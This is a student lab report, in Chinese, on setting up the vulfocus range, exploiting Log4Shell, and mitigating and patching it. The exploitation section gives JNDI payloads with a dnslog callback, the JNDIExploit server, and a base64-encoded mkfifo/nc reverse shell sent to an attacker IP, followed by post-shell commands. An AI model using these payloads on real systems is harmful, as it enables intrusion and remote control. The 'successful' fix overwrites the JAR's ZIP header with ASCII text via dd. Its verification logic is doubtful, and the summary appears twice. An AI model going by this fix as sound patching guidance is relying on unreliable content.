# log4j

## 实验任务

log4j环境搭建以及漏洞利用检测工作

## 实验环境

* **系统环境** ：Kali Linux on ARM64(aarch64)
* **Docker版本** ：Docker
* **目标容器** ：vulfocus/vulfocus:latest (x86_64架构)
* **虚拟机**：Parallels Desktop20.0

## 实验步骤

### 1.log4j环境搭建

#### 1. vulfocus容器搭建

克隆仓库

```bash
git clone https://github.com/c4pr1c3/ctf-games.git
```

搭建

```bash
# ref: https://www.kali.org/docs/containers/installing-docker-on-kali/#installing-docker-ce-on-kali-linux
# 注意以下内容复制粘贴自上述 ref 链接，版本若有更新，请优先参考 ref 链接
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list 

curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

sudo apt update && sudo apt install -y docker-ce docker-ce-cli containerd.io jq

# 将当前用户添加到 docker 用户组，免 sudo 执行 docker 相关指令
sudo usermod -aG docker $USER
newgrp docker  # 立即应用新组权限

# 切换到 root 用户
sudo su -

# 使用国内 Docker Hub 镜像源（可选步骤）
# 国内 Docker Hub 镜像源可用性随时可能变化，请自测可用性
cat <<EOF > /etc/docker/daemon.json
{
  "registry-mirrors": [
    "https://docker.tabssr.top"
  ]
}
EOF

# 重启 docker 守护进程
systemctl restart docker

# 提前拉取 vulfocus 镜像
docker pull vulfocus/vulfocus:latest
```

安装QEMU用户态模拟工具，使ARM64系统能够运行x86_64架构的二进制文件：

```bash
sudo apt-get install qemu-user-static
```

配置多架构支持：

使用tonistiigi/binfmt工具注册跨平台模拟支持：

```bash
sudo docker run --privileged --rm tonistiigi/binfmt --install all

```

此命令会注册多种架构的支持，包括amd64(x86_64)、arm、arm64等。

验证跨架构支持是否生效：

使用Alpine镜像进行测试，确认跨架构支持正常工作：

```bash
docker run --platform linux/amd64 --rm -it alpine:latest sh -c "uname -m"
```

输出结果应为 `x86_64`，表明虽然在ARM64物理机上，但容器中运行的是x86_64环境。

修改Docker Compose配置：

编辑docker-compose.yml文件，添加platform参数指定容器运行的目标平台：

```yaml
services:
  vul-focus:
    platform: linux/amd64  # 添加此行
    image: vulfocus/vulfocus:latest
    # 其他配置保持不变...

```

启动容器服务：

切换到ctf-games/fofapro/vulfocus路径下

使用修改后的配置启动vulfocus服务：

```bash
bash start.sh
```

选择host-only的ip地址

![1742138073046](image/网络安全丁梦/1742138073046.png)

结果验证：

执行 `docker ps`命令可以看到容器成功运行并保持健康状态：

```
CONTAINER ID   IMAGE                      COMMAND                  CREATED          STATUS                    PORTS                               NAMES
f1dbefb28904   vulfocus/vulfocus:latest   "sh /vulfocus-api/ru…"   10 seconds ago   Up 10 seconds (healthy)   0.0.0.0:80->80/tcp, :::80->80/tcp   vulfocus_vul-focus_1

```

登陆http://10.37.133.3/

账号admin，密码admin

![1742138046570](image/网络安全丁梦/1742138046570.png)

#### 2. log4j环境搭建

如下图路径，下载

![1742138235143](image/网络安全丁梦/1742138235143.png)

修改镜像过期时间

![1742138487756](image/网络安全丁梦/1742138487756.png)

下载好后可在首页看到

![1742138504203](image/网络安全丁梦/1742138504203.png)

点击启动

![1742138526164](image/网络安全丁梦/1742138526164.png)

访问地址 `10.37.133.3:56174`

![1742139977490](image/网络安全丁梦/1742139977490.png)

### 2.漏洞存在检测

#### 2.1 确认容器状态

```
docker ps                         
```

![1742624567415](image/网络安全丁梦/1742624567415.png)

确认log4j2-rce容器正在运行，端口映射为56334。

#### 从容器中提取JAR文件

```
# 进入容器
docker exec -it recursing_proskuriakova bash

# 复制JAR文件到本地
docker cp recursing_proskuriakova:/demo/demo.jar ./
```

![1742624849646](image/网络安全丁梦/1742624849646.png)

![1742625735633](image/网络安全丁梦/1742625735633.png)

#### 环境准备

```
# 安装Java开发工具包
sudo apt update
sudo apt install default-jdk

# 验证jar工具可用性
jar --version
```

![1742625777372](image/网络安全丁梦/1742625777372.png)

#### JAR文件分析

```
# 创建临时目录
mkdir temp && cd temp

# 解压 JAR 文件
jar xf ../demo.jar

# 查看 pom.xml 或 MANIFEST.MF 文件中的依赖信息
cat META-INF/MANIFEST.MF

# 查找 log4j 相关类文件
find . -name "*.class" | grep -i log4j
```

![1742625939252](image/网络安全丁梦/1742625939252.png)

检查MANIFEST.MF文件，确认关键信息：

Implementation-Title: log4j2_rce
Spring-Boot-Version: 2.1.3.RELEASE
Start-Class: com.example.log4j2_rce.Log4j2RceApplication

找到关键类文件： ./BOOT-INF/classes/com/example/log4j2_rce/Log4j2RceApplication.class

初步结论，通过分析发现：

应用使用log4j2框架
包含log4j2_rce相关类
为Spring Boot应用，版本2.1.3.RELEASE
存在可疑的RCE（远程代码执行）相关类

### 3.漏洞利用检测

访问http://www.dnslog.cn/

Get SubDomain

![1742139344862](image/网络安全丁梦/1742139344862.png)

在kali虚拟机中执行

```
curl -X POST http://10.37.133.3:56174/hello -d 'payload="${jndi:ldap://m8ljvi.dnslog.cn/ssd}"'
```

出现报错，服务器不支持 `POST`请求方法

![1742139849289](image/网络安全丁梦/1742139849289.png)

改用GET

```
curl -X GET http://10.37.133.3:56174/hello?payload='${jndi:ldap://m8ljvi.dnslog.cn/ssd}'
```

![1742139880741](image/网络安全丁梦/1742139880741.png)

得到ok

![1742140185201](image/网络安全丁梦/1742140185201.png)

### 4.漏洞利用

```
 wget https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
```

这里实际是攻击者

![1742630544922](image/网络安全丁梦/1742630544922.png)

因为失败了几次，最后下载的成功的带有.5

```
unzip JNDIExploit.v1.2.zip.5
```

1. **确保先开启监听**（在一个新终端中）：

```bash
nc -lvnp 9999
```

![1742634333574](image/网络安全丁梦/1742634333574.png)

2. **在另一个终端启动JNDI服务**：

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.37.132.3
```

![1742634318914](image/网络安全丁梦/1742634318914.png)

3. **生成反弹shell命令**：

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.37.132.3 9999 >/tmp/f' | base64
```

4. **发送漏洞利用请求**（使用生成的base64编码）：

```bash
curl -X GET "http://10.37.133.3:56334/hello?payload=\${jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMzcuMTMyLjMgOTk5OSA+L3RtcC9mCg==}"
```

![1742634305767](image/网络安全丁梦/1742634305767.png)

如果成功，你会在nc监听窗口看到shell连接。然后在获得的shell中执行：

```bash
whoami
pwd
find / -name flag 2>/dev/null
ls -la /root
```

### 5.漏洞缓解

#### 1. 分析当前环境

首先，我们需要分析被攻击的容器环境：

```bash
docker ps
```

输出：

```
CONTAINER ID   IMAGE                               COMMAND                CREATED          STATUS          PORTS                                         NAMES
8e86d0e9ef1e   vulfocus/log4j2-rce-2021-12-09:1   "java -jar /demo/dem…" About a minute ago   Up About a minute   0.0.0.0:40615->8080/tcp, :::40615->8080/tcp   objective_driscoll
```

检查容器详情：

```bash
docker inspect objective_driscoll
```

![1742742983303](image/网络安全丁梦/1742742983303.png)

#### 2. 临时缓解措施 - 通过JVM参数禁用JNDI查找

##### 停止当前容器

```bash
docker stop objective_driscoll
```

##### 重新启动并添加JVM参数来禁用JNDI查找

```bash
# 移除旧容器但保留其名称以重用
docker rm objective_driscoll

# 使用相同的镜像启动新容器，但添加安全参数
docker run -d --name objective_driscoll \
  -e JAVA_OPTS="-Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true" \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  /bin/sh -c "java ${JAVA_OPTS} -jar /demo/demo.jar"
```

![1742743055555](image/网络安全丁梦/1742743055555.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker run -d --name objective_driscoll \
  -e JAVA_OPTS="-Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true" \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  /bin/sh -c "java ${JAVA_OPTS} -jar /demo/demo.jar"
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
bfca568f93133cae399687bb3b1978a3aecad223df2fa4dabb4b7fdead10c954
```

##### 验证JVM参数是否生效

```bash
docker exec objective_driscoll ps aux | grep java
```

![1742743110532](image/网络安全丁梦/1742743110532.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker exec objective_driscoll ps aux | grep java
root           1  0.0  0.6 230684 13300 ?        Ssl  15:17   0:00 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /bin/sh /bin/sh -c java  -jar /demo/demo.jar
root           8 95.3 21.4 4087404 432784 ?      Sl   15:17   0:41 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -jar /demo/demo.jar
```

通过ps aux命令查看进程状态，我们可以发现：

```bash
root           1  0.0  0.6 230684 13300 ?        Ssl  15:17   0:00 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /bin/sh /bin/sh -c java  -jar /demo/demo.jar
root           8 95.3 21.4 4087404 432784 ?      Sl   15:17   0:41 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -jar /demo/demo.jar
```

这表明：

JVM安全参数未被正确应用到Java命令中
容器通过QEMU进行x86_64到ARM64的二进制转译执行
环境变量展开可能在QEMU转译过程中出现问题

```bash
# 重新启动容器，直接在命令行中添加安全参数
docker run -d --name objective_driscoll \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
```

![1742743540032](image/网络安全丁梦/1742743540032.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker run -d --name objective_driscoll \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
084815a8e54d2df4be58335c743c8934b065dcc73ae32d4dbdaafe014eff6b62
                                                                                
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker exec objective_driscoll ps aux | grep java
root           1 91.8 10.9 3717788 221836 ?      Ssl  15:24   0:10 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
```

从输出中我们可以看到：

安全参数成功应用 - 所有三个关键参数 `(-Dlog4j2.formatMsgNoLookups=true、-Dcom.sun.jndi.ldap.object.trustURLCodebase=false和-Dlog4j2.disableJndi=true)`现在都出现在Java进程的命令行中。

QEMU转译执行 - 进程是通过 `/usr/libexec/qemu-binfmt/x86_64-binfmt-P`在ARM64主机上运行x86_64二进制文件。注意命令行中同时出现了java和参数之前的java，这是QEMU转译的特殊情况。

架构转译特性 - 进程使用了大量内存(3717788 KB ≈ 3.7GB)，CPU使用率也较高(91.8%)，这是由于架构转译带来的额外开销。

改进总结

1. 直接命令行参数vs环境变量：在跨架构容器中，直接在命令行中指定JVM参数比通过环境变量更可靠，因为环境变量可能在QEMU转译层中丢失或未正确传递。
2. 验证参数应用：通过ps aux命令查看进程参数是确认安全缓解措施是否生效的关键步骤，不应该省略。
3. 跨架构注意事项：在ARM64上运行x86_64容器时，性能会有所下降，且某些行为可能与原生架构有所不同，这需要在实际操作和排错中特别注意。

这种方法成功应用了所有安全参数，有效缓解了Log4j漏洞，即使在跨架构环境中也能正常工作

### 6.漏洞修复部分

#### 第一次尝试（失败）

首先，让我们确认目标容器的运行状态：

```bash
docker ps
```

输出显示：

![1742746825326](image/网络安全丁梦/1742746825326.png)

永久修复方案 - 移除 JndiLookup 类

这个修复方案通过从 log4j-core 包中移除 JndiLookup 类来完全禁用 JNDI 查找功能，从而永久修复漏洞。

##### 进入容器执行修复操作

```bash
# 进入容器
docker exec -it xenodochial_panini /bin/bash

# 安装必要工具
apt-get update && apt-get install -y zip unzip
```

![1742746878666](image/网络安全丁梦/1742746878666.png)

##### 创建工作目录并准备环境

```bash
# 创建临时工作目录
mkdir -p /tmp/jar-fix
cd /tmp/jar-fix

# 复制并解压主应用 jar 文件
cp /demo/demo.jar ./
unzip demo.jar
```

![1742746908978](image/网络安全丁梦/1742746908978.png)

```bash
# 查找 log4j 相关的 jar 文件
find BOOT-INF/lib -name "*log4j*.jar"
```

![1742746937561](image/网络安全丁梦/1742746937561.png)

##### 修改 log4j-core 库以移除 JndiLookup 类

```bash
# 创建子目录处理 log4j-core jar
mkdir log4j-fix
cd log4j-fix

# 复制并解压 log4j-core
cp ../BOOT-INF/lib/log4j-core-2.14.0.jar ./
unzip log4j-core-2.14.0.jar
```

![1742746961127](image/网络安全丁梦/1742746961127.png)

```bash
# 删除 JndiLookup 类 - 这是漏洞的根源
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class

# 验证类文件已被删除
ls -la org/apache/logging/log4j/core/lookup/JndiLookup.class 2>/dev/null || echo "已成功删除 JndiLookup 类"

```

![1742747026507](image/网络安全丁梦/1742747026507.png)

```bash
# 重新打包修改后的 jar 文件
jar -cf log4j-core-2.14.0-fixed.jar .

# 用修复版替换原始 jar 文件
cp log4j-core-2.14.0-fixed.jar ../BOOT-INF/lib/log4j-core-2.14.0.jar

# 返回主目录
cd /tmp/jar-fix
```

![1742747046958](image/网络安全丁梦/1742747046958.png)

##### 重新打包修复后的应用 JAR

```bash
# 重新打包整个应用
jar -cfM fixed-demo.jar META-INF BOOT-INF org

# 备份原始应用
cp /demo/demo.jar /demo/demo.jar.bak

# 替换为修复后的应用
cp fixed-demo.jar /demo/demo.jar

# 设置正确的权限
chmod 644 /demo/demo.jar

# 清理临时文件
cd /
rm -rf /tmp/jar-fix
```

![1742747064377](image/网络安全丁梦/1742747064377.png)

##### 退出容器并重启应用使修复生效

```bash
# 退出容器
exit

# 重启容器应用修复
docker restart xenodochial_panini

# 检查容器是否成功重启
docker ps
```

出现问题：objective_driscoll重启失败

![1742746721620](image/网络安全丁梦/1742746721620.png)

分析容器启动失败的原因

```bash
# 查看日志
docker logs xenodochial_panini
```

![1742746738905](image/网络安全丁梦/1742746738905.png)

通过分析 Docker 容器日志，我发现了容器启动失败的具体原因：

#### 错误分析

###### 从日志中可以看出，应用最初成功启动了（Spring Boot banner和初始化消息正常），但在重启时出现了严重错误：

```
Exception in thread "main" java.lang.IllegalStateException: Failed to get nested archive for entry BOOT-INF/lib/spring-boot-starter-2.1.3.RELEASE.jar
...
Caused by: java.lang.IllegalStateException: Unable to open nested entry 'BOOT-INF/lib/spring-boot-starter-2.1.3.RELEASE.jar'. It has been compressed and nested jar files must be stored without compression. Please check the mechanism used to create your executable jar file
```

###### 根本原因

这个错误是由我们修改和重新打包JAR文件的方式导致的：

1. **压缩问题**：Spring Boot要求嵌套JAR文件（BOOT-INF/lib/中的依赖）必须不压缩存储，但我们的重新打包过程压缩了这些文件
2. **JAR结构破坏**：我们使用的 `jar -cfM`命令没有保留Spring Boot加载器所需的特殊结构

###### 重要的命令分析

```bash
jar -cfM fixed-demo.jar META-INF BOOT-INF org
```

这个命令中：

- `-c` - 创建新归档
- `-f` - 指定输出文件
- `-M` - 不创建MANIFEST文件

但我们缺少了关键的 `-0`（零）标志，该标志会指定"仅存储 - 不压缩"。

###### 解决方案

经验教训

1. **Spring Boot JAR修改复杂**：Spring Boot可执行JAR有特殊结构，不能用标准JAR工具简单修改

#### 第二次尝试（失败）

##### 修复 Log4j 漏洞 - 正确重新打包 JAR 文件

##### 1. 进入容器并准备环境

```bash
# 进入容器
docker exec -it infallible_mccarthy /bin/bash

# 安装必要工具
apt-get update && apt-get install -y zip unzip
```

![1742776055940](image/网络安全丁梦/1742776055940.png)

##### 2. 创建工作目录

```bash
# 创建临时工作目录
mkdir -p /tmp/jar-fix
cd /tmp/jar-fix
```

##### 3. 定位并修复 log4j-core 库

```bash
# 复制原始 JAR 以便进行修改
cp /demo/demo.jar ./original-demo.jar

# 找出包含 log4j-core 的路径
jar -tf original-demo.jar | grep log4j-core
```

![1742776231063](image/网络安全丁梦/1742776231063.png)

BOOT-INF/lib/log4j-core-2.14.0.jar

```bash
# 提取单个 JAR 文件
jar -xf original-demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 创建临时目录以修改 log4j-core
mkdir log4j-fix
cd log4j-fix

# 解压 log4j-core JAR
jar -xf ../BOOT-INF/lib/log4j-core-2.14.0.jar

# 删除 JndiLookup 类
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class

# 确认删除成功
ls -la org/apache/logging/log4j/core/lookup/JndiLookup.class 2>/dev/null || echo "已成功删除 JndiLookup 类"

# 重新创建 log4j-core JAR（使用 -0 不压缩）
jar -cf0 ../BOOT-INF/lib/log4j-core-2.14.0.jar .

# 返回上一级目录
cd ..
```

![1742776305333](image/网络安全丁梦/1742776305333.png)

##### 4. 使用适当方法修改 Spring Boot JAR

对于 Spring Boot 应用，最安全的方法是：

```bash
# 创建新目录存放修改后的 JAR 文件
mkdir fixed-jar
cp original-demo.jar fixed-jar/demo.jar

# 备份原始文件
cp /demo/demo.jar /demo/demo.jar.backup

# 复制修复后的 log4j-core 到原始 JAR
cd fixed-jar
mkdir -p BOOT-INF/lib/
cp ../BOOT-INF/lib/log4j-core-2.14.0.jar BOOT-INF/lib/

# 使用 zip 命令更新 JAR 中的文件（不更改其他结构）
zip -u demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 将修复后的 JAR 替换原始文件
cp demo.jar /demo/demo.jar
```

![1742776356148](image/网络安全丁梦/1742776356148.png)

##### 5. 退出容器并重启应用

```bash
# 退出容器
exit

# 重启容器
docker restart infallible_mccarthy

```

1. **使用 -0 标志**：确保 JAR 文件内容存储而不压缩
2. **使用 zip -u 更新**：只替换特定文件，保持其他结构不变
3. **最小化修改范围**：只替换有问题的 log4j-core JAR，不重建整个应用 JAR

![1742776669629](image/网络安全丁梦/1742776669629.png)

容器启动失败，分析原因

容器成功启动（从 Spring Boot 的启动横幅和初始化信息可以看出）
它运行了一段时间，并且至少处理了一个请求（我们能看到在 00:25:06 时的日志记录）
在 00:32:49 时，某些情况触发了应用程序的关闭
当尝试重新启动时，修改后的 JAR 文件结构导致了失败

#### 第三次尝试（成功）

尝试以下确保正确保留 JAR 文件结构的方法：

![1742795856678](image/网络安全丁梦/1742795856678.png)

```bash
# 从原始镜像启动一个新容器
# 进入容器
docker exec -it musing_lichterman /bin/bash

# 在容器内，安装所需工具并修复 JAR 文件
apt-get update && apt-get install -y zip unzip

# 仅提取 log4j-core JAR 文件
cd /tmp
mkdir fix
cd fix
cp /demo/demo.jar ./
unzip -p demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar > log4j-core.jar

# 修复 log4j-core JAR 文件
mkdir core
cd core
unzip ../log4j-core.jar
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class
zip -0 -r ../fixed-log4j-core.jar .

# 更新原始 JAR 文件，不进行重新压缩
cd ..
cp demo.jar demo.jar.original
printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc
zip -0 demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 替换原始 JAR 文件
cp demo.jar /demo/demo.jar
```

![1742796050462](image/网络安全丁梦/1742796050462.png)

完成这些步骤后，重启容器：

```bash
exit

docker restart musing_lichterman
```

![1742796019570](image/网络安全丁梦/1742796019570.png)

启动成功

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker restart musing_lichterman

musing_lichterman
                                                                                                                   
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker ps               
CONTAINER ID   IMAGE                              COMMAND                  CREATED         STATUS                   PORTS                                         NAMES
7789812eb21b   vulfocus/log4j2-rce-2021-12-09:1   "java -jar /demo/dem…"   3 minutes ago   Up 7 seconds             0.0.0.0:47147->8080/tcp, :::47147->8080/tcp   musing_lichterman
f1dbefb28904   vulfocus/vulfocus:latest           "sh /vulfocus-api/ru…"   2 weeks ago     Up 4 minutes (healthy)   0.0.0.0:80->80/tcp, :::80->80/tcp             vulfocus_vul-focus_1
```

这种方法的关键区别在于：

始终使用 -0 标志以避免压缩
使用 printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc 来确保正确的 ZIP 头部
仅对必要的部分进行最小限度的修改

### 6.验证Log4j漏洞修复

#### 1. 设置验证环境

首先，确保你的攻击环境已准备就绪：

```bash
# 在攻击者机器上（10.37.132.3）
# 启动JNDI服务器
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.37.132.3

# 在攻击者机器的另一个终端中
# 启动监听器以接收潜在的回调
nc -lvnp 9999
```

#### 2. 测试漏洞

发送一个与利用时使用的测试负载类似的请求：

```bash
# 发送带有JNDI查找的测试负载
curl -X GET "http://10.37.133.3:47147/hello?payload=  \${jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZXN0X2V4cGxvaXQK}"
```

如果执行此负载，它将尝试在 `/tmp/test_exploit`处创建一个文件。

### 如何验证：

```bash
# 检查应用程序是否仍能正常运行（应返回正常响应）
curl -X GET "http://10.37.133.3:47147/hello?payload=\${jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZXN0X2V4cGxvaXQK}"
```

![1742796931976](image/网络安全丁梦/1742796931976.png)

```bash
# 连接到容器以检查利用命令是否被执行
docker exec -it musing_lichterman /bin/bash
ls -la /tmp/test_exploit  # 如果修复有效，此文件不应存在
```

![1742796893667](image/网络安全丁梦/1742796893667.png)

### 额外验证：

检查应用程序日志以获取修复的证据：

```bash
# 查看应用程序日志
docker logs musing_lichterman | grep -i jndi
```

![1742796975349](image/网络安全丁梦/1742796975349.png)

##### Log4j 漏洞修复验证分析

###### 日志分析结果

通过 `docker logs musing_lichterman | grep -i jndi`命令输出的结果，我们可以清晰地看到漏洞修复成功的证据：

###### 关键发现

1. **JNDI表达式被当作普通文本处理**

   ```
   2025-03-24 06:03:43.896 ERROR 1 --- [nio-8080-exec-1] c.e.l.Log4j2RceApplication : $jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQK
   ```

   注意表达式以 `$jndi` 而不是 `${jndi}` 形式出现，这表明表达式没有被解析执行。
2. **多次攻击尝试均无效**
   日志显示在6:03、6:13和6:14时间点有多次攻击尝试，但所有请求都只是被当作普通字符串记录下来。
3. **应用正常运行**
   服务器在收到攻击请求后继续正常运行，没有出现崩溃或异常行为。
4. **没有LDAP连接尝试**
   没有任何日志表明系统尝试进行LDAP连接或执行Base64编码的命令。

###### 综合结论

漏洞修复已经成功实施：

1. 成功移除了 `JndiLookup`类，完全禁用了JNDI查找功能
2. 攻击载荷被当作普通文本处理，不会触发任何代码执行
3. 即使面对多次攻击尝试，应用也保持稳定运行
4. 日志中清晰记录了攻击尝试但没有执行危险操作

这种通过直接从JAR包中移除有问题的类文件的修复方法比简单的配置参数调整更彻底，为应用提供了永久性的保护，防止此类漏洞被利用。

# 出现的问题解决

# Log4j 漏洞实验问题与解决方案总结

## 1. 环境搭建问题

### ARM64系统运行x86_64架构容器问题

**问题描述**：在ARM64架构的Mac上运行vulfocus容器(x86_64架构)时出现`exec /bin/sh: exec format error`错误，导致容器启动后立即退出。

**解决方案**：
- 安装QEMU用户态模拟工具：`sudo apt-get install qemu-user-static`
- 配置多架构支持：`sudo docker run --privileged --rm tonistiigi/binfmt --install all`
- 在Docker Compose中指定平台：添加`platform: linux/amd64`参数
- 验证跨架构支持：`docker run --platform linux/amd64 --rm -it alpine:latest sh -c "uname -m"`

## 2. 漏洞缓解阶段问题

### JVM安全参数未正确应用

**问题描述**：通过环境变量方式添加Log4j安全参数时，参数未能正确传递到Java进程。

**原因**：在QEMU跨架构模拟环境中，环境变量展开存在问题。

**解决方案**：
- 避免使用环境变量传递参数
- 直接在命令行中添加安全参数：
  ```bash
  docker run -d --name objective_driscoll -p 40615:8080 vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false \
  -Dlog4j2.disableJndi=true -jar /demo/demo.jar
  ```
- 验证参数是否应用：`docker exec objective_driscoll ps aux | grep java`

## 3. 漏洞修复阶段问题

### 第一次尝试修复失败

**问题描述**：修改JAR文件后容器无法启动，出现`IllegalStateException: Unable to open nested entry ...has been compressed`错误。

**原因**：Spring Boot要求嵌套JAR文件必须以不压缩方式存储，`jar -cfM`命令破坏了结构。

### 第二次尝试修复失败

**问题描述**：即使使用`-0`不压缩标志，容器仍然启动失败。

**原因**：修改方式仍然破坏了Spring Boot JAR的特殊结构。

### 第三次尝试成功

**成功解决方案**：
1. 从容器中提取log4j-core JAR文件：
   ```bash
   unzip -p demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar > log4j-core.jar
   ```

2. 修复log4j-core JAR (移除JndiLookup类)：
   ```bash
   mkdir core && cd core
   unzip ../log4j-core.jar
   rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class
   zip -0 -r ../fixed-log4j-core.jar .
   ```

3. 正确更新原始JAR文件：
   ```bash
   printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc
   zip -0 demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar
   ```

4. 替换并重启：
   ```bash
   cp demo.jar /demo/demo.jar
   docker restart musing_lichterman
   ```

## 关键经验总结

1. **跨架构容器运行**：
   - 在ARM64上运行x86_64容器需要QEMU模拟支持
   - 跨架构容器会有性能开销(高CPU和内存使用)
   - 某些行为可能与原生架构有差异

2. **Java安全参数传递**：
   - 在跨架构环境中，直接命令行指定参数比环境变量更可靠
   - 务必验证参数是否生效，不仅依赖于容器是否启动成功

3. **Spring Boot JAR修改**：
   - Spring Boot JAR具有特殊结构，不能简单用标准JAR工具重新打包
   - 修改嵌套JAR时必须使用不压缩(-0)选项
   - 需要保留正确的ZIP文件头部信息
   - 最小化修改原则，只替换必要的文件

4. **漏洞修复验证**：
   - 重启后验证应用正常运行
   - 进行攻击测试验证修复有效性
   - 检查日志确认JNDI表达式被当作普通文本处理- 验证参数是否应用：`docker exec objective_driscoll ps aux | grep java`

## 3. 漏洞修复阶段问题

### 第一次尝试修复失败

**问题描述**：修改JAR文件后容器无法启动，出现`IllegalStateException: Unable to open nested entry ...has been compressed`错误。

**原因**：Spring Boot要求嵌套JAR文件必须以不压缩方式存储，`jar -cfM`命令破坏了结构。

### 第二次尝试修复失败

**问题描述**：即使使用`-0`不压缩标志，容器仍然启动失败。

**原因**：修改方式仍然破坏了Spring Boot JAR的特殊结构。

### 第三次尝试成功

**成功解决方案**：
1. 从容器中提取log4j-core JAR文件：
   ```bash
   unzip -p demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar > log4j-core.jar
   ```

2. 修复log4j-core JAR (移除JndiLookup类)：
   ```bash
   mkdir core && cd core
   unzip ../log4j-core.jar
   rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class
   zip -0 -r ../fixed-log4j-core.jar .
   ```

3. 正确更新原始JAR文件：
   ```bash
   printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc
   zip -0 demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar
   ```

4. 替换并重启：
   ```bash
   cp demo.jar /demo/demo.jar
   docker restart musing_lichterman
   ```

## 关键经验总结

1. **跨架构容器运行**：
   - 在ARM64上运行x86_64容器需要QEMU模拟支持
   - 跨架构容器会有性能开销(高CPU和内存使用)
   - 某些行为可能与原生架构有差异

2. **Java安全参数传递**：
   - 在跨架构环境中，直接命令行指定参数比环境变量更可靠
   - 务必验证参数是否生效，不仅依赖于容器是否启动成功

3. **Spring Boot JAR修改**：
   - Spring Boot JAR具有特殊结构，不能简单用标准JAR工具重新打包
   - 修改嵌套JAR时必须使用不压缩(-0)选项
   - 需要保留正确的ZIP文件头部信息
   - 最小化修改原则，只替换必要的文件

4. **漏洞修复验证**：
   - 重启后验证应用正常运行
   - 进行攻击测试验证修复有效性
   - 检查日志确认JNDI表达式被当作普通文本处理